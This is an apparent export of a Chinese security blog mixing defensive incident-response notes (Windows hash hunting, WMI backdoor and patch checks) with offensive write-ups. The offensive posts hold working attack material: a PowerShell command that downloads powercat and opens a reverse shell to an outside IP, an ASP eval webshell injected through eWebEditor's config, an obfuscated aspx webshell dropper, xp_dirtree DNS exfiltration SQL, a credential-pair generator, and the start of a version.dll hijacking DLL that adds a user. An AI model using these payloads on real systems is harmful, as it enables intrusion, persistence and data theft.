'&#123;a[substr($3,1,2)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//统计开头的前三个字母的数量排序$ awk '&#123;a[substr($3,1,3)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last_x_hashcat_masks_sus_length | sort -nr -k2//统计开头的前四个字母的数量排序$ awk '&#123;a[substr($3,1,4)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//统计开头的最后一个字母的数量排序$ awk '&#123;a[substr($3,length($3),1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//提取特定字符集的字典grep -P "^[[:lower:]]+$" 2014_1_last__ &gt;&gt;2014_1_last__lowergrep -P "^[[:upper:]]+$" 2014_1_last__ &gt;&gt;2014_1_last__uppergrep -P "^[[:digit:]]+$" 2014_1_last__ &gt;&gt;2014_1_last__digitgrep -P "^[[:punct:] ]+$" 2014_1_last__ &gt;&gt;2014_1_last__punctgrep -P "^[[:lower:][:upper:]]+$" 2014_1_last__ | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:upper:]]+$" &gt;&gt;2014_1_last__loweruppergrep -P "^[[:upper:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:upper:]]+$" | grep -P -v "^[[:punct:] ]+$" &gt;&gt;2014_1_last__upperpunctgrep -P "^[[:lower:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:punct:] ]+$" &gt;&gt;2014_1_last__lowerpunctgrep -P "^[[:lower:][:digit:]]+$" 2014_1_last__ | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:digit:]]+$" &gt;&gt;2014_1_last__lowerdigitgrep -P "^[[:upper:][:digit:]]+$" 2014_1_last__ | grep -P -v "^[[:upper:]]+$" | grep -P -v "^[[:digit:]]+$" &gt;&gt;2014_1_last__upperdigitgrep -P "^[[:digit:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:digit:]]+$" | grep -P -v "^[[:punct:] ]+$" &gt;&gt;2014_1_last__digitpunctgrep -P "^[[:lower:][:digit:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:digit:]]+$" | grep -P -v "^[[:punct:] ]+$" | grep -P -v "^[[:lower:][:digit:]]+$" | grep -P -v "^[[:lower:][:punct:] ]+$" | grep -P -v "^[[:digit:][:punct:] ]+$"&gt;&gt;2014_1_last__lowerdigitpunctgrep -P "^[[:upper:][:digit:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:upper:]]+$" | grep -P -v "^[[:digit:]]+$" | grep -P -v "^[[:punct:] ]+$" | grep -P -v "^[[:upper:][:digit:]]+$" | grep -P -v "^[[:upper:][:punct:] ]+$" | grep -P -v "^[[:digit:][:punct:] ]+$"&gt;&gt;2014_1_last__upperdigitpunctgrep -P "^[[:lower:][:upper:][:digit:]]+$" 2014_1_last__ | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:upper:]]+$" | grep -P -v "^[[:digit:]]+$" | grep -P -v "^[[:lower:][:upper:]]+$" | grep -P -v "^[[:lower:][:digit:]]+$" | grep -P -v "^[[:upper:][:digit:]]+$" &gt;&gt;2014_1_last__lowerupperdigitgrep -P "^[[:lower:][:upper:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:lower:][:upper:]]+$" | grep -P -v "^[[:lower:]]+$" | grep -P -v "^[[:upper:]]+$" | grep -P -v "^[[:punct:] ]+$" | grep -P -v "^[[:lower:][:punct:] ]+$" | grep -P -v "^[[:upper:][:punct:] ]+$" | grep -P -v "^[[:lower:][:upper:]]+$" &gt;&gt;2014_1_last__lowerupperpunctgrep -P "^[[:lower:][:upper:][:digit:][:punct:] ]+$" 2014_1_last__ | grep -P -v "^[[:alnum:]]+$" | grep -P -v "^[[:punct:] ]+$" | grep -P -v "^[[:lower:][:punct:] ]+$" | grep -P -v "^[[:upper:][:punct:] ]+$" | grep -P -v "^[[:digit:][:punct:] ]+$" | grep -P -v "^[[:upper:][:digit:][:punct:] ]+$" | grep -P -v "^[[:lower:][:digit:][:punct:] ]+$" | grep -P -v "^[[:lower:][:upper:][:punct:] ]+$" &gt;&gt;2014_1_last__lowerupperdigitpunct//用户名和密码组合$ cat user.txtrootmanager$ cat pass.txt123456asdpasswordadmin$ awk 'NR==FNR&#123;a[FNR]=$1;num=FNR&#125;NR&gt;FNR&#123;for(i=1;i&lt;=num;i++)&#123;print a[i] ":" $1&#125;&#125;' user.txt pass.txtroot:123manager:123root:456manager:456root:asdmanager:asdroot:passwordmanager:passwordroot:adminmanager:admin]]></content>
      <tags>
        <tag>regx sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急响应笔记 windows 常用命令记录]]></title>
    <url>%2F2019%2F02%2F12%2Fthreathunter-windows%2F</url>
    <content type="text"><![CDATA[以下案例均为项目中遇到的，欢迎补充,文章随时更新 0x01 删除指定hash值的文件需求：已知恶意文件md5值为：59B18D6146A2AA066F661599C496090D、6FF97A7DABF09EBB07C157F286DC81AD ，需要全部删除。 代码如下： 123[array]$md5=Get-FileHash .\*.exe -Algorithm md5$md5 | Where -Property Hash -in -Value "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD" | Remove-Item 例图： ps:低版本powershell不支持，以下代码为通用获取md5函数 12345678910111213141516function Get-md5 &#123; Param($path) if(Test-Path $path -PathType Leaf )&#123; $md5file=certutil -hashfile $path MD5 [string]$hash=$md5file -match "^[a-f0-9]&#123;32&#125;$" $retVal = New-Object -TypeName psobject -Property @&#123; PATH = $path Hash = $hash &#125; $retVal &#125;else&#123; write-host [-] 'Get-md5' c:\windows\system32\calc.exe -ForegroundColor Red break &#125;&#125; cmd下获取md5:certutil -hashfile c:\windows\system32\cmd.exe MD5 |findstr /r &quot;^[a-fA-F0-9]*$&quot; 支持powershell 2.0 的get-hashhttps://gist.github.com/jaredcatkinson/7d561b553a04501238f8e4f061f112b7 案例：搜索系统目录下恶意文件 123456789101112131415161718function Get-md5 &#123; Param($path) if(Test-Path $path -PathType Leaf )&#123; $md5file=certutil -hashfile "$path" MD5 [string]$hash=$md5file -match "^[a-f0-9]&#123;32&#125;$" $retVal = New-Object -TypeName psobject -Property @&#123; Path = $path Hash = $hash.ToUpper() &#125; $retVal &#125;else&#123; &#125;&#125;[array]$md5=Get-ChildItem $env:SystemRoot -ErrorAction 0 -Force -recurse -Filter *.exe | % &#123;Get-md5 $_.FullName&#125;$md5 | where &#123;($_.Hash -eq "6983F7001DE10F4D19FC2D794C3EB534" -or $_.Hash -eq "59B18D6146A2AA066F661599C496090D" -or $_.Hash -eq "CCE36235A525858EB55070847296C4C8" -or $_.Hash -eq "9911858E9BEC100CCF6D8134915103EC" -or $_.Hash -eq "74E2A43B2B7C6E258B3A3FC2516C1235" -or $_.Hash -eq "D4E2EBCF92CF1B2E759FF7CE1F5688CA" -or $_.Hash -eq "FB89D40E24F5FF55228C38B2B07B2E77" -or $_.Hash -eq "637BF46077AD083659D3B96A010F38FE")&#125; | %&#123;write-host $_Path&#125;[array]$md5=@() 0x02 寻找某一日期创建的文件需求：得知某一日期遭攻击，想列出攻击日期内产生的文件 1forfiles /m *.exe /d +2019/2/12 /s /p c:\ /c "cmd /c echo @path @fdate @ftime" 2&gt;nul 例图 forfiles是一个很强大的命令，windows下有非常详细的帮助，这里就不赘述用法了。 0x03 wmi无文件后门检测1234Get-WmiObject -Namespace root\default -list | Where-Object &#123;$_.name -Match "^[a-z]"&#125;Get-WmiObject -Namespace root\subscription -class commandlineeventconsumerGet-WmiObject -Namespace root\subscription -class __eventfilterGet-WmiObject -Namespace root\subscription -class __FilterToConsumerBinding 图例： 0x04 powershell解码 需求：遇到powershell -enc 方式执行需要解码 解码 1[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UnicodeBase64编码放到此处")) 编码 1[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("任意字符串放此处")) 例图： 0x05 计划任务相关1、 查看计划任务列表 schtasks /query /fo LIST 2、查看计划任务详情 schtasks /query /v /tn &quot;\Microsoft\windows\Bluetooths&quot; /fo list 例图： 0x06 判断是否有打永恒之蓝补丁12345678910[array]$hotfixid=get-hotfix -id KB4012606,KB3210720,KB3210721,KB4012598,KB4012212,KB4012215,KB4012213,KB4012216,KB4012214,KB4012217,KB4013198,KB4015549 -ErrorAction 0 | ForEach-Object &#123;$_.HotFixID&#125;if ($hotfixid -eq $null) &#123; Write-host "[-] 危险: MS17010B补丁未打，易遭永恒之蓝攻击!" -ForegroundColor Red Write-host "补丁参考1: https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" -ForegroundColor DarkYellow Write-host "补丁参考2: https://b.360.cn/other/onionwormfix" -ForegroundColor DarkYellow &#125; else &#123; Write-Host "[+] ms17010 补丁以打" -ForegroundColor Green&#125; 0x07 防火墙及ipsec相关操作windows防火墙允许445入站 netsh advfirewall set allprofiles state on netsh advfirewall firewall add rule name=&quot;allow tcp 445&quot; dir=in protocol=tcp localport=445 action=allow #允许445 ipsec 禁止139、445、135端口 12345678910111213141516netsh ipsec static add policy name=tomcatgonetsh ipsec static add filterlist name=Filter1netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=TCP mirrored = yesecho “135端口已经关闭”netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=TCP mirrored = yesecho “139端口已经关闭”netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=TCP mirrored = yesecho “445端口已经关闭”netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=UDP mirrored = yesnetsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=UDP mirrored = yesnetsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=UDP mirrored = yesnetsh ipsec static add filteraction name=Filteraction1 action=blocknetsh ipsec static add rule name=Rule1 policy=tomcatgo filterlist=Filter1 filteraction=FilteraAtion1netsh ipsec static set policy name=tomcatgo assign=y 0x08 获取进程md51get-process | where path -ne $null | %&#123;Get-FileHash $_.path -Algorithm md5&#125; 0x09 恶意服务检测12Get-WmiObject win32_service |?&#123; $_.name -eq 'svchost.exe' -and $_.PathName -notlike '*C:\WINDOWS\System32\svchost.exe*' -and $_.PathName -notlike '*c:\Windows\SysWOW64\svchost.exe*'&#125; | select Name, DisplayName, State, PathName 12Get-WmiObject win32_service | ?&#123;$_.PathName -like '*svchost.exe*'&#125; | select Name, DisplayName, @&#123;Name="Path"; Expression=&#123;$_.PathName.split('')[0]&#125;&#125; | Format-List 12Get-WmiObject win32_service |select name, @&#123;N='FileHash';E=&#123;(Get-FileHash $_.pathname -Algorithm md5 -ErrorAction 0).hash&#125;&#125;,pathname| %&#123;if($_.filehash -eq '51D3A1E2285E2E931A553281BBA10E81')&#123;Write-Host 恶意服务: $_.name 执行路径: $_.pathname -ForegroundColor Red&#125;&#125; 检测多个hash值 123456789101112131415161718function Get-md5 &#123; Param($path) if(Test-Path $path -PathType Leaf )&#123; $md5file=certutil -hashfile "$path" MD5 [string]$hash=$md5file -match "^[a-f0-9]&#123;32&#125;$" $retVal = New-Object -TypeName psobject -Property @&#123; Path = $path Hash = $hash.ToUpper() &#125; $retVal &#125;else&#123; &#125;&#125;[array]$services_md5=Get-WmiObject win32_service |?&#123; $_.PathName -notlike '*C:\WINDOWS\System32\svchost*' -and $_.PathName -notlike '*c:\Windows\SysWOW64\svchost*'&#125;|select name, @&#123;N='FileHash';E=&#123;(Get-md5 $_.pathname.replace('"','') ).hash&#125;&#125;,pathname #$services_md5 |Where &#123;$_.FileHash -eq "6983F7001DE10F4D19FC2D794C3EB534" -or $_.FileHash -eq "59B18D6146A2AA066F661599C496090D" -or $_.FileHash -eq "CCE36235A525858EB55070847296C4C8" -or $_.FileHash -eq "9911858E9BEC100CCF6D8134915103EC" -or $_.FileHash -eq "74E2A43B2B7C6E258B3A3FC2516C1235" -or $_.FileHash -eq "D4E2EBCF92CF1B2E759FF7CE1F5688CA" -or $_.FileHash -eq "FB89D40E24F5FF55228C38B2B07B2E77" -or $_.FileHash -eq "637BF46077AD083659D3B96A010F38FE"&#125;$services_md5 |Where &#123;$_.FileHash -eq '00A8C2DD875BC4B458CBFED72AAF45F4' -or $_.FileHash -eq '498A07B121D7A3815563DC15AC306EBD' -or $_.FileHash -eq 'B4DAABEBBF16A7C8871209D946E917F3'&#125; 0x10 常用wmi命令1、查看服务详情 wmic service get name,pathname,processid,startname,status,state /value 例图： 2、查看进程详情 wmic process get CreationDate,name,processid,commandline,ExecutablePath /value 图例： 3、查看补丁 wmic qfe get hotfixid 4、查看启动项 wmic startup 图例： 5、安装软件列表 wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name /FORMAT:table 6、获取快捷方式列表 wmic PATH Win32_ShortcutFile get name 7、获取dns缓存记录 可通过dns 缓存记录中查看是否有恶意请求ipconfig /displaydns 其它 更详细快捷的查杀建议使用pchunter 火绒剑 auturuns 等安全辅助工具]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急分析取证工具篇]]></title>
    <url>%2F2019%2F01%2F26%2FVolatility-tools%2F</url>
    <content type="text"><![CDATA[应急响应笔记持续更新中，大部分内容都是工作上遇到的，欢迎讨论 1. 共享访问监控 功能：查看连接 场景：某机器提供共享，共享文件夹一直报毒，使用该工具可快速知道哪些机器访问了该机器共享 下载地址：networkopenedfiles-x64.zip 使用效果如下： 设置存储日志： ps:后来发现windows 自带共享会话监视功能 其它:组策略中开启审核对象访问,并对共享目录中添加对应的审核账号的写入属性成功和删除的审核,即可在操作系统安全日志中看到相关记录 2. wifi使用记录 功能：查看使用wifi历史记录 场景：看该电脑是否有连接过其它无线网络，以证明非本内网络导致感染 下载地址：wifihistoryview 3. usb使用记录 功能：查看插入或拔出系统的任何USB设备的详细信息。 场景：查看是否为u盘传输导致感染 下载地址：usblogview.zip 4. 内存取证 内存镜像工具 DumpIt.exe 介绍：DumpIt 是一款绿色免安装的 windows 内存镜像取证工具。利用它我们可以轻松地将一个系统的完整内存镜像下来，并用于后续的调查取证工作。 下载地址 Comae-Toolkit http://www.secist.com/archives/2076.html http://blog.md5.red/?p=578 raw 内存取证 github:https://github.com/volatilityfoundation exe下载:https://www.volatilityfoundation.org/releases 12python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 pslistpython vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 psxview 参考:https://xz.aliyun.com/t/2497 5. Ghost 镜像浏览 ghost-explorer 系统比较复杂不便现场分析，可备份ghost 文件，后面用ghost-explorer 进行提取相关文件 背景：一次应急过程，客户铲掉了受感染系统，而这台服务器刚好是关键线索。幸好客户前面做了ghost备份。后面通过ghost-explorer 提取ghost 镜像注册表、日志信息成功溯源。 官网 https://www.symantec.com/connect/blogs/ghost-explorer]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从注入到webshell]]></title>
    <url>%2F2019%2F01%2F06%2Fsql-pentest%2F</url>
    <content type="text"><![CDATA[背景：一朋友渗透测试中遇到一个注入点可执行命令，但无法突破写shell卡住,mssql注入dba权限whoami为network权限木马暂时未上 注入点: https://********.com/member/news.asp?ID=6666 判断是否站库分离12select @@servername`select host_name()` 发现站库是同服务器 直接sqlshell执行命令返回太慢，且容易产生大量不必要日志，web目录不可写，所以这里使用powershell反弹shell 1powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 443 -e cmd web目录不可写 发现有php进程，看php进程是否以system权限启动，如果为system权限启动并且对应的web目录可写，就直接省去了提权tasklist /fi &quot;IMAGENAME eq php.exe&quot; /v执行发现并不是高权限启动 发现eweb编辑器，且配置文件插入了常用iis可解析后缀 登录eweb编辑器发现没有开启asp上传相关组件，无法使用eweb编辑器进行上传任何文件，但是可以修改配置文件，也就是说并不是真正的不可写，修改配置文件调用的是Adodb.Stream，而通常上传代码为Scripting.FileSystemObject 组件 查看ewebeditor/admin/private.asp 拿shell思路写config.asp配置文件修改写配置文件将密码修改为:aaaaaaaaa&quot;:eval request(&quot;a&quot;)&#39;aaaaaaaaa为原本密码成功连接webshellhttps://********.com/ewebeditor/asp/config.asp 既然Adodb.Stream 可以修改配置文件，那么同样也可以用来上传文件，下图是eweb中写配置文件代码，我们可以直接抠出来用 菜刀执行自定义代码 利用Adodb.Stream 写aspxshell 1234567891011121314151617181920212223Sub WriteFile(s_FileName, s_Text) On Error Resume Next Err.Clear Dim stm Set stm = Server.CreateObject("Adodb.Stream") stm.Type = 2 stm.mode = 3 stm.charset = "utf-8" stm.Open stm.WriteText s_Text stm.SaveToFile Server.Mappath(s_FileName), 2 stm.flush stm.Close Set stm = Nothing If Err.Number&lt;&gt;0 Then Err.Clear Response.Write "&lt;br&gt;&lt;br&gt;Error: Write config file, reason:&lt;br&gt;1. You do not have write privileges for eWebEditor/asp/config.asp&lt;br&gt;2. Server have disabled Adodb.Stream Object" Response.End End If End Subaspxshell= "&lt;"&amp;"%"&amp;"@"&amp;"Page Language"&amp;"="&amp;""""&amp;"Jscript"&amp;""""&amp;"%"&amp;"&gt;"&amp;"&lt;"&amp;"%"&amp;"eval"&amp;"("&amp;"Request"&amp;"."&amp;"Item"&amp;"["&amp;""""&amp;"pass"&amp;""""&amp;"]"&amp;","&amp;""""&amp;"unsafe"&amp;""""&amp;")"&amp;";"&amp;"%"&amp;"&gt;"Call WriteFile("../uploadfile/config.aspx", aspxshell) 成功获得aspxshell：https://********.com/ewebeditor/asp/config.aspx pass 这里为什么要用aspx shell呢？因为.net有可能继承users组权限，且不受fso(FileSystemObject)组件影响,当然也可以使用无fsoshell 数据库反弹shell无法对web目录写文件原因下几个图片可以说明： 数据库shell权限： webshell 下权限]]></content>
  </entry>
  <entry>
    <title><![CDATA[DNS Log 杂记]]></title>
    <url>%2F2018%2F09%2F19%2FDNSlog%2F</url>
    <content type="text"><![CDATA[public 能执行 xp_dirtree 函数 (可以用来dns 回显注入) public 权限下不能列任何目录(网上很多文章说public能列) mssql dns 回显注入： 网上教程说需要两个域名，实际一个域名就可以:) 配置域名： 条件：支持多语句执行 12345DECLARE @host varchar(1024); SELECT @host=(SELECT CURRENT_USER+'bind.google.com'); EXEC('master..xp_dirtree"\\'+@host+'\foobar$"'); 远程外网服务器监听： ./sqlmap/lib/request/dns.py 即可有回显结果 sqlmap 可直接利用dns 回显注入来突破鸡肋的延时注入 sqlmap --dns-domain bind.google.com(你的域名)]]></content>
      <tags>
        <tag>dnslog sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取http信息小工具]]></title>
    <url>%2F2018%2F09%2F19%2Fhttpinfo-tool%2F</url>
    <content type="text"><![CDATA[功能: 获取网站titele信息 服务器信息批量的话结合 for 命令使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231#define CURL_STATICLIB //必须在包含curl.h前定义#include &lt;io.h&gt; #include&lt;iostream&gt;#include"curl/curl.h"#include&lt;ctime&gt; #include&lt;string&gt;#include &lt;cctype&gt;#include &lt;regex&gt;#include "libiconv\iconv.h"#include &lt;algorithm&gt; //std::string my_str="sssss";//my_str.erase(std::remove(my_str.begin(), my_str.end(), '\t'), my_str.end());using namespace std; using namespace std::regex_constants;//以下四项是必须的#pragma comment ( lib, "libcurl.lib" )#pragma comment (lib, "libiconv.lib")#pragma comment ( lib, "ws2_32.lib" )#pragma comment ( lib, "winmm.lib" )#pragma comment ( lib, "wldap32.lib" )static int writer(char *, size_t, size_t, string *);//string HostToIp(const std::string&amp; host);static bool init(CURL *&amp;, char *,string *,string *);using std::string;/*!https://github.com/svenyao/libiconv/blob/master/docs/libiconv.example.test.txt 对字符串进行语言编码转换 param from 原始编码，比如"GB2312",的按照iconv支持的写 param to 转换的目的编码 param save 转换后的数据保存到这个指针里，需要在外部分配内存 param savelen 存储转换后数据的内存大小 param src 原始需要转换的字符串 param srclen 原始字符串长度*/int convert(const char *from, const char *to, char* save, int savelen, const char *src, int srclen)&#123; iconv_t cd; const char *inbuf = src; char *outbuf = save; size_t outbufsize = savelen; int status = 0; size_t savesize = 0; size_t inbufsize = srclen; const char* inptr = inbuf; size_t insize = inbufsize; char* outptr = outbuf; size_t outsize = outbufsize; cd = iconv_open(to, from); iconv(cd, NULL, NULL, NULL, NULL); if (inbufsize == 0) &#123; status = -1; goto done; &#125; while (insize &gt; 0) &#123; size_t res = iconv(cd, (const char**)&amp;inptr, &amp;insize, &amp;outptr, &amp;outsize); if (outptr != outbuf) &#123; int saved_errno = errno; int outsize = outptr - outbuf; strncpy(save+savesize, outbuf, outsize); errno = saved_errno; &#125; if (res == (size_t)(-1)) &#123; if (errno == EILSEQ) &#123; int one = 1; iconvctl(cd, ICONV_SET_DISCARD_ILSEQ,&amp;one); status = -3; &#125; else if (errno == EINVAL) &#123; if (inbufsize == 0) &#123; status = -4; goto done; &#125; else &#123; break; &#125; &#125; else if (errno == E2BIG) &#123; status = -5; goto done; &#125; else &#123; status = -6; goto done; &#125; &#125; &#125; status = strlen(save);done: iconv_close(cd); return status;&#125;/* * convert(...) string封装 * [in|out]put string : src_str * s[from|to]: 编码名称 */int convert_str(const std::string&amp; sfrom, const std::string&amp; sto, std::string&amp; src_str)&#123; int ilen = src_str.length(); int ioutlen = ilen * 3; char *outbuf = (char *)malloc(ioutlen); memset(outbuf, 0, ioutlen); int nret = convert(sfrom.c_str(), sto.c_str(), outbuf, ioutlen, src_str.c_str(), ilen); if (nret &lt; 0) &#123; free(outbuf); outbuf = NULL; return nret; &#125; outbuf[nret] = '\0'; src_str = outbuf; free(outbuf); outbuf = NULL; return nret;&#125;void Usage(char* prog)&#123; printf("[*]:%s Usage-&gt; http://www.360.net \r\n",prog); printf("[*]:code by: lostwolf \r\n");&#125;int main(int argc,char* argv[])&#123; CURL *conn = NULL; CURLcode code; string buffer; string h_buffer; string XPowered; string content; string charset; char *ip; long response_code; string title; string header; string server; if (argc != 2) &#123; Usage(argv[0]); return 0; &#125; //lstrcpyW(tp.Host,argv[1]); curl_global_init(CURL_GLOBAL_DEFAULT); char* url=argv[1]; init(conn,url,&amp;buffer,&amp;h_buffer); code = curl_easy_perform(conn); content=buffer.c_str(); header=h_buffer.c_str(); regex re_title("&lt;title&gt;([^&lt;]+)&lt;/title&gt;"); regex re_charset("content=\".*charset=(.*?)\""); regex re_server("Server:\\s(.*?)\\r"); regex re_XPowered("X-Powered-By:\\s(.*?)\\r"); smatch match_XPowered; smatch match_charset; smatch match_title; smatch match_server; if ( regex_search(content, match_charset, re_charset) ) &#123; charset=match_charset[1].str(); &#125;else&#123; charset="utf-8"; &#125; if ( regex_search(content, match_title, re_title) ) &#123; title=match_title[1].str(); convert_str(charset, "gb2312", title); &#125; if ( regex_search(header, match_server, re_server) ) &#123; server=match_server[1].str(); &#125; if ( regex_search(header, match_XPowered, re_XPowered) ) &#123; XPowered=match_server[1].str(); &#125; if(server==XPowered)&#123; XPowered=""; &#125; if((code == CURLE_OK) &amp;&amp; !curl_easy_getinfo(conn, CURLINFO_PRIMARY_IP, &amp;ip) &amp;&amp; ip) &#123; curl_easy_getinfo(conn, CURLINFO_RESPONSE_CODE, &amp;response_code); cout &lt;&lt;"Target-&gt;["&lt;&lt;url&lt;&lt;']'&lt;&lt;' '; cout &lt;&lt;"Code-&gt;["&lt;&lt;response_code&lt;&lt;']'&lt;&lt;' '; cout &lt;&lt;"IP-&gt;["&lt;&lt;ip&lt;&lt;']'&lt;&lt;' '; cout &lt;&lt;"Server-&gt;["&lt;&lt;server&lt;&lt;']'&lt;&lt;' '; cout &lt;&lt;XPowered&lt;&lt;' '; cout &lt;&lt;"Title-&gt;["&lt;&lt;title&lt;&lt;']'&lt;&lt;' '; cout &lt;&lt;'\n'; curl_easy_cleanup(conn); &#125;else&#123; cout &lt;&lt;"[!] "&lt;&lt;url&lt;&lt;" connect failed!"&lt;&lt;' '; cout &lt;&lt; '\n'; &#125; return 0;&#125;static bool init(CURL *&amp;conn, char *url,string *p_buffer,string *h_buffer)&#123; CURLcode code; conn = curl_easy_init(); code = curl_easy_setopt(conn, CURLOPT_URL, url); //code = curl_easy_setopt(conn, CURLOPT_VERBOSE, 1L); //详细 code = curl_easy_setopt(conn, CURLOPT_TIMEOUT, 3); code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, 1); curl_easy_setopt(conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"); code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer); code = curl_easy_setopt(conn, CURLOPT_HEADERDATA, h_buffer); code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, p_buffer); return true;&#125;static int writer(char *data, size_t size, size_t nmemb, string *writerData)&#123; unsigned long sizes = size * nmemb; if (writerData == NULL) return 0; writerData-&gt;append(data, sizes); return sizes;&#125; 下载:hinfo.exe]]></content>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新版pentestbox支持win10]]></title>
    <url>%2F2018%2F03%2F11%2Fpentestbox%2F</url>
    <content type="text"><![CDATA[以完美支持windows 10 以更新至 metasploit 5 增加了 searchsploit 增加 mycli burp 使用新版 以破解版 壳改为了cmder table 补全更好用了 metasploit 自动连接到 pgsql pgsql 随msf 启动而启动 随msf关闭而关闭 其它自己挖掘 已知bug: 解决办法： 下载advapi32.dll丢进当前目录下载链接：pentestbox 提取码: h73i]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[劫持version.dll 添加用户]]></title>
    <url>%2F2017%2F07%2F24%2FFake-dll%2F</url>
    <content type="text"><![CDATA[核心代码由AheadLib工具生成,很多软件存在version.dll 劫持问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 头文件#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"Netapi32.lib")using namespace std;////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 导出函数#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=_AheadLib_GetFileVersionInfoA,@1")#pragma comment(linker, "/EXPORT:GetFileVersionInfoByHandle=_AheadLib_GetFileVersionInfoByHandle,@2")#pragma comment(linker, "/EXPORT:GetFileVersionInfoExW=_AheadLib_GetFileVersionInfoExW,@3")#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeA=_AheadLib_GetFileVersionInfoSizeA,@4")#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeExW=_AheadLib_GetFileVersionInfoSizeExW,@5")#pragma comment(linker, "/EXPORT:GetFileVersionInfoSizeW=_AheadLib_GetFileVersionInfoSizeW,@6")#pragma comment(linker, "/EXPORT:GetFileVersionInfoW=_AheadLib_GetFileVersionInfoW,@7")#pragma comment(linker, "/EXPORT:VerFindFileA=_AheadLib_VerFindFileA,@8")#pragma comment(linker, "/EXPORT:VerFindFileW=_AheadLib_VerFindFileW,@9")#pragma comment(linker, "/EXPORT:VerInstallFileA=_AheadLib_VerInstallFileA,@10")#pragma comment(linker, "/EXPORT:VerInstallFileW=_AheadLib_VerInstallFileW,@11")#pragma comment(linker, "/EXPORT:VerLanguageNameA=_AheadLib_VerLanguageNameA,@12")#pragma comment(linker, "/EXPORT:VerLanguageNameW=_AheadLib_VerLanguageNameW,@13")#pragma comment(linker, "/EXPORT:VerQueryValueA=_AheadLib_VerQueryValueA,@14")#pragma comment(linker, "/EXPORT:VerQueryValueW=_AheadLib_VerQueryValueW,@15")#pragma comment(lib, "netapi32.lib")////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 宏定义#define EXTERNC extern "C"#define NAKED __declspec(naked)#define EXPORT __declspec(dllexport)#define ALCPP EXPORT NAKED#define ALSTD EXTERNC EXPORT NAKED void __stdcall#define ALCFAST EXTERNC EXPORT NAKED void __fastcall#define ALCDECL 